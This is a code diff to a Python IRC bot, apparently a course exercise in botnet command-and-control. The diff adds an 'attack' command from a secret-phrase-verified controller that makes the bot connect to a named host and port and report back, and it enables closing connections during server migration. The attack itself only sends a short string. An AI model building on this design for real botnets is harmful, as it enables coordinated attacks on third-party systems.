@@ -88,9 +88,13 @@ def listen():
                             port = int(splitmessage[wordLocation+2])
                             chan = splitmessage[wordLocation+3]
                             migrate(host,port,chan)
-
                         else:
                             print("Received invalid 'move' command. Ignoring.")
+                    elif((firstWord == "attack") and (madeContactWithControl) and (nickOfSender == controllerNick)):
+                        if(len(splitmessage) >= (wordLocation + 2)):
+                            host = splitmessage[wordLocation+1]
+                            port = int(splitmessage[wordLocation+2])
+                            attack(host,port)
 
     except Exception as e:
         print("Error2: " + str(e))
@@ -115,12 +119,32 @@ def pvtmsgToController(messageToSend):
     return
 
 
-'''
+
 # Function that attacks hostName:hostPort by attempting to connect to hostName:hostPort
 # and sending a string containing the attack count and nick of the bot. Sends status message
 # to controler after attack is attempted
 def attack(hostName, hostPort):
-'''
+    global attackCount
+    print("Recieved 'attack' command from controller. Beginning attack on " + hostName)
+    try:
+        attackConnection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        attackConnection.connect((hostName,hostPort))
+        attackMsg = str(attackCount) + " " + nick
+        bytesSent = attackConnection.send(attackMsg.encode("utf-8"))
+        if(bytesSent > 0):
+            pvtmsgToController("attack successful")
+            print("attack successful.")
+            attackCount = attackCount + 1
+        else:
+            pvtmsgToController("attack unsuccessful")
+            print("attack unsuccessful")
+
+
+    except Exception as e:
+        pvtmsgToController("attack unsuccessful")
+        print("attack unsuccessful")
+        print("Error4: " + str(e))
+
 
 # Function to move bot from current IRC server to IRC server on hostName:hostPort #channel
 # Will send status of migration attempt to controller on current IRC before disconnecting
@@ -148,7 +172,7 @@ def migrate(hostName, hostPort, channel):
                 nickSet = True                                                  # Change nickSet flag to true
                 joinChannel(channel,IRCmoveCon)
         pvtmsgToController("Move to new IRC server successful. Leaving your server now...")
-        #IRCconnection.close()
+        IRCconnection.close()
         IRCconnection = IRCmoveCon
     except Exception as e:
         print("Error3: " + str(e))
@@ -165,6 +189,7 @@ def main():
     global CHANNEL
     global SECRET_PHRASE                                                        # Secret code word that IRC bot will listen for to ID controller
     global shutdownFlag                                                         # Will only be true when controller issues 'shutdown' command
+    global attackCount
 
     if len(sys.argv) == 5:
         HOSTNAME = str(sys.argv[1])
